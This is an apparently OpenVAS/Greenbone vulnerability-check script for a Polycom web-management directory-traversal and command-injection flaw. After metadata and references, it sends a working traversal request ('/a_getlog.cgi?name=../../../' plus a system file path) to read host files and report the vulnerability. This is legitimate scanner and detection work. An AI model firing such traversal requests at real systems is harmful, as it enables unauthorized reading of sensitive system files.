if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103661" );
	script_bugtraq_id( 52301 );
	script_tag( name: "cvss_base", value: "9.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:P/A:P" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_name( "Polycom Products Directory Traversal and Command Injection Vulnerabilities" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/52301" );
	script_xref( name: "URL", value: "http://seclists.org/fulldisclosure/2012/Mar/18" );
	script_xref( name: "URL", value: "http://blog.tempest.com.br/joao-paulo-campello/path-traversal-on-polycom-web-management-interface.html" );
	script_xref( name: "URL", value: "http://www.polycom.com/" );
	script_xref( name: "URL", value: "http://blog.tempest.com.br/joao-paulo-campello/polycom-web-management-interface-os-command-injection.html" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2013-02-13 11:31:54 +0100 (Wed, 13 Feb 2013)" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2013 Greenbone Networks GmbH" );
	script_dependencies( "find_service.sc", "httpver.sc", "os_detection.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_require_keys( "Host/runs_unixoide" );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "solution", value: "Updates are available. Please see the references for more information." );
	script_tag( name: "summary", value: "Multiple Polycom products are prone to a directory-traversal
  vulnerability and a command-injection vulnerability because it fails
  to sufficiently sanitize user-supplied input.

  Remote attackers can use a specially crafted request with directory-
  traversal sequences ('../') to retrieve arbitrary files in the context
  of the application. Also, attackers can execute arbitrary commands
  with the privileges of the user running the application." );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("misc_func.inc.sc");
port = http_get_port( default: 80 );
if(http_vuln_check( port: port, url: "/", pattern: "Polycom", usecache: TRUE )){
	files = traversal_files( "linux" );
	for pattern in keys( files ) {
		file = files[pattern];
		url = "/a_getlog.cgi?name=../../../" + file;
		if(http_vuln_check( port: port, url: url, pattern: pattern )){
			report = http_report_vuln_url( port: port, url: url );
			security_message( data: report, port: port );
			exit( 0 );
		}
	}
}
exit( 99 );

